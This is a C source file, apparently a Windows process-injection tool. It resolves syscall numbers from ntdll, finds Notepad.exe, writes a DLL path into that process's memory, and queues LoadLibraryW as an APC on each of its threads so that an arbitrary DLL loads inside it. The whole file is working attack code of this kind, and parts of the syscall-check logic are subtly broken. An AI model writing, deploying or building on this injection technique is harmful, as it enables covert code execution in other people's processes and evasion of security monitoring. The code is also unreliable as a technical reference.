#include "Headers/ntapi.h"
#include <Psapi.h>
#include <tlhelp32.h>

UINT_PTR CreateThreadJMP;
UINT_PTR AllocateMemJMP;
UINT_PTR OpenProcessJMP;
UINT_PTR WriteMemJMP;
UINT_PTR CloseJMP;

DWORD CreateThreadSSN;
DWORD AllocateMemSSN;
DWORD CloseSSN;
DWORD WriteMemSSN;
DWORD OpenProcessSSN;

void getStuffs(IN HMODULE hNtdll, IN LPCSTR NtFunction, OUT DWORD* SSN, OUT UINT_PTR* jmpAddress) {

	BYTE SyscallOpcodes[2] = { 0x0F, 0x05 };
	UINT_PTR NtFunctionAddress = (UINT_PTR)GetProcAddress(hNtdll, NtFunction);

	if (NtFunctionAddress == NULL) {
		warn("Could not get address to function, error: 0x%lx", GetLastError());
		return;
	}

	*SSN = ((PBYTE)(NtFunctionAddress + 4))[0];
	*jmpAddress = NtFunctionAddress + 0x12;

	if (memcmp(SyscallOpcodes, jmpAddress, sizeof(SyscallOpcodes)) == 1) {
		warn("Syscall signature does not match opcodes, exiting");
		return;
	}

	okay("Syscall signature for %s is a match", NtFunction);
	okay("got the SSN of %s (0x%lx)", NtFunction, *SSN);
	info("\n\t| %s ", NtFunction);
	info("\n\t|\n\t| ADDRESS\t| 0x%p\n\t| SYSCALL\t| 0x%p\n\t| SSN\t\t| 0x%lx\n\t|____________________________________\n\n", NtFunctionAddress, *jmpAddress, *SSN);

}

HMODULE getMod(LPCWSTR modName) {
	HMODULE hModule = NULL;

	hModule = GetModuleHandleW(modName);

	if (hModule == NULL) {
		warn("Could not get handle to module, error: 0x%lx", GetLastError());
		return NULL;
	}

	okay("Got the handle to module %S", modName);
	info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
	return hModule;
}

int main() {
	/*-----[INITIALIZING VARIABLES]-----*/

	// Main Variables
	DWORD	PID = NULL;
	DWORD	TID = NULL;
	HANDLE	hProcess = NULL;
	HANDLE	hThread = NULL;
	HMODULE	hNtdll = NULL;
	HMODULE	hKernel32 = NULL;
	LPVOID	rBuffer = NULL;
	DWORD	OldProtect = NULL;
	NTSTATUS status = NULL;
	PTHREAD_START_ROUTINE	SolaarLoadLibrary = NULL;

	// Variables for Retrieving CID
	char		targetProcess[] = "Notepad.exe";
	DWORD		aProcesses[1024] = { NULL };
	DWORD		cbNeeded = NULL;
	DWORD		cProcesses = NULL;

	// Payload Variables
	wchar_t				dllPath[MAX_PATH] = L"\\path\\to\\file.dll";
	size_t				pathSize = sizeof(dllPath);
	size_t				bytesWritten = 0;
	size_t				bytesRead = 0;
	OBJECT_ATTRIBUTES	OA;
	InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);

	hNtdll = getMod(L"ntdll.dll");
	hKernel32 = getMod(L"kernel32.dll");

	if (hNtdll == NULL) {
		warn("hNTDLL == NULL. error: 0x%lx", GetLastError());
		goto CLEANUP;
	}

	myNtTestAlert pfnNtTestAlert = (myNtTestAlert)GetProcAddress(hNtdll, "NtTestAlert");

	SolaarLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	okay("Got the address of LoadLibraryW from KERNEL32");
	info("\\___[ SolaarLoadLibrary\n\t\\_0x%p]\n", SolaarLoadLibrary);

	getStuffs(hNtdll, "NtCreateThreadEx", &CreateThreadSSN, &CreateThreadJMP);
	getStuffs(hNtdll, "NtOpenProcess", &OpenProcessSSN, &OpenProcessJMP);
	getStuffs(hNtdll, "NtClose", &CloseSSN, &CloseJMP);
	getStuffs(hNtdll, "NtWriteVirtualMemory", &WriteMemSSN, &WriteMemJMP);
	getStuffs(hNtdll, "NtAllocateVirtualMemory", &AllocateMemSSN, &AllocateMemJMP);


	/*------[GATHERING LIST OF PROCESSES]------*/
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		warn("Could not enumerate processes, error: %ld", GetLastError());
		return -1;
	}

	cProcesses = cbNeeded / sizeof(DWORD);

	/*------[LOCATING TARGET PROCESS]------*/
	for (unsigned int i = 0; i < cProcesses; i++) {
		CLIENT_ID CID = { (HANDLE)aProcesses[i], NULL };
		TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
		status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
		printf("Status: 0x%lx\n", status);
		if (status == STATUS_SUCCESS)
		{
			HMODULE hMod;
			cbNeeded = NULL;

			if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
				&cbNeeded))
			{
				GetModuleBaseName(hProcess, hMod, szProcessName,
					sizeof(szProcessName) / sizeof(TCHAR));
			}

			info(TEXT("%s  (PID: %u)\n"), szProcessName, aProcesses[i]);
			if (strcmp(szProcessName, targetProcess) == 0) {
				printf("TARGET PROCESS LOCATED!!!\n");
				PID = aProcesses[i];
				break;
			}
		}
	}
	if (PID == NULL) {
		warn("Couldn't get PID for process");
		return -1;
	}

	



	/*-----[TYPICAL INJECTION PROCESS]-----*/

	status = NtAllocateVirtualMemory(hProcess, &rBuffer, NULL, &pathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

	if (status != STATUS_SUCCESS) {
		warn("failed to allocate memory, error: 0x%lx", status);
		goto CLEANUP;
	}

	okay("Allocated memory in target process");

	status = NtWriteVirtualMemory(hProcess, rBuffer, dllPath, sizeof(dllPath), &bytesWritten);
	if (status != STATUS_SUCCESS) {
		warn("Could write to process memory, error: 0x%lx", status);
		goto CLEANUP;
	}
	if (bytesWritten == sizeof(dllPath)) {
		okay("BytesWritten == pathSize");
	}
	okay("Wrote %zu-bytes to process memory", bytesWritten);	

	/*-----[APC Injection Begins]-----*/

	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap != INVALID_HANDLE_VALUE) {
		THREADENTRY32 te32;
		te32.dwSize = sizeof(THREADENTRY32);
		if (Thread32First(hThreadSnap, &te32)) {
			do {
				if (te32.th32OwnerProcessID == PID) {
					// Found a thread associated with the specified process
					TID = te32.th32ThreadID;
					info("TID: %ld", TID);
					hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, TID);

					if (hThread == NULL) {
						warn("Handle to Thread is NULL, error: %ld", GetLastError());
						continue;
					}
					if (!QueueUserAPC((PAPCFUNC)SolaarLoadLibrary, hThread, rBuffer)) {
						warn("Could not query APC, error: %ld", GetLastError());
						continue;
					}

				}
			} while (Thread32Next(hThreadSnap, &te32));
		}
		okay("created APCs, Letting the dogs out now");
		pfnNtTestAlert();

		CloseHandle(hThreadSnap);
	}


	
	okay("finished execution.");
	info("cleaning up now");
	goto CLEANUP;

CLEANUP:

	if (hThread != NULL) {
		info("Closing Handle to Thread");
		NtClose(hThread);
	}

	if (hProcess != NULL) {
		info("Closing Handle to Process");
		NtClose(hProcess);
	}

	okay("Finished cleanup, goodbye o/");
	return EXIT_SUCCESS;
}
